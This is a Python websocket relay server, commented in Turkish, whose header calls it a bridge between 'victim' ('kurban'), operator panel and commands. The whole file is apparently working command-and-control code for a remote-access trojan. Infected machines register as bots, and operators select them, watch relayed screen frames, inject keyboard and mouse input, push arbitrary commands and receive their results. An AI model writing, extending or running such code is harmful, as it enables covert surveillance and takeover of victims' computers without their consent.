# -*- coding: utf-8 -*-
# Relay - kurban + panel + komut köprüsü
import asyncio, json, os
import websockets

rooms = {}    # { bot_id: {'bot': ws, 'panels': [ws, ...]} }
panels = {}   # { panel_ws: bot_id }

async def handler(ws):
    role = None
    bot_id = None
    try:
        async for msg in ws:
            try: data = json.loads(msg)
            except: continue
            t = data.get('type')
            
            # ---- BOT KAYIT ----
            if t == 'bot_register':
                bot_id = data['id']
                room = rooms.setdefault(bot_id, {'bot': None, 'panels': []})
                room['bot'] = ws
                # tüm panellere bildir
                for p in list(panels.keys()):
                    try: await p.send(json.dumps({'type':'bot_online','id':bot_id}))
                    except: pass
                await ws.send(json.dumps({'type':'ok'}))
            
            # ---- PANEL KAYIT ----
            elif t == 'panel_register':
                role = 'panel'
                panels[ws] = None
                await ws.send(json.dumps({'type':'bot_list','ids':list(rooms.keys())}))
            
            # ---- PANEL BOT SEÇTİ ----
            elif t == 'panel_select':
                # eski odadan çık
                old = panels.get(ws)
                if old and old in rooms and ws in rooms[old]['panels']:
                    rooms[old]['panels'].remove(ws)
                # yeni odaya gir
                panels[ws] = data['id']
                bot_id = data['id']
                if bot_id not in rooms:
                    rooms[bot_id] = {'bot': None, 'panels': []}
                if ws not in rooms[bot_id]['panels']:
                    rooms[bot_id]['panels'].append(ws)
                await ws.send(json.dumps({'type':'selected','id':bot_id}))
                # bot online mı bildir
                online = rooms[bot_id]['bot'] is not None
                await ws.send(json.dumps({'type':'bot_state','id':bot_id,'online':online}))
            
            # ---- EKRAN KARESİ (bot → panel) ----
            elif t == 'frame' and bot_id:
                room = rooms.get(bot_id)
                if room:
                    for p in list(room['panels']):
                        try: await p.send(msg)
                        except: pass
            
            # ---- INPUT (panel → bot) ----
            elif t == 'input' and bot_id:
                room = rooms.get(bot_id)
                if room and room['bot']:
                    try: await room['bot'].send(msg)
                    except: pass
            
            # ---- KOMUT (panel → bot) ----
            elif t == 'panel_cmd' and bot_id:
                room = rooms.get(bot_id)
                if room and room['bot']:
                    try: await room['bot'].send(json.dumps({
                        'type':'push_cmd','cmd':data['cmd']}))
                    except: pass
            
            # ---- BOT SONUCU (bot → panele) ----
            elif t == 'bot_result' and bot_id:
                room = rooms.get(bot_id)
                if room:
                    for p in list(room['panels']):
                        try: await p.send(msg)
                        except: pass
    
    except Exception:
        pass
    finally:
        # temizlik
        if bot_id and bot_id in rooms and rooms[bot_id]['bot'] is ws:
            rooms[bot_id]['bot'] = None
            for p in list(panels.keys()):
                try: await p.send(json.dumps({'type':'bot_offline','id':bot_id}))
                except: pass
        if ws in panels:
            old = panels.pop(ws)
            if old and old in rooms and ws in rooms[old]['panels']:
                rooms[old]['panels'].remove(ws)

async def main():
    port = int(os.environ.get('PORT', 8080))
    async with websockets.serve(handler, '0.0.0.0', port, ping_interval=20, ping_timeout=20):
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
